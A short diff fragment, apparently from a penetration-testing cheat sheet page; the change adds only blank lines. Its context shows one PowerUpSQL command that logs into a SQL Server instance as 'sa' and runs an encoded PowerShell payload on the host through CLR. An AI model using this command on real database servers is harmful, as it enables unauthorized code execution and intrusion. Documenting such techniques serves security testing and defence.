@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:39.601743+00:00'
 ```bash
 Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
 ```
+
+
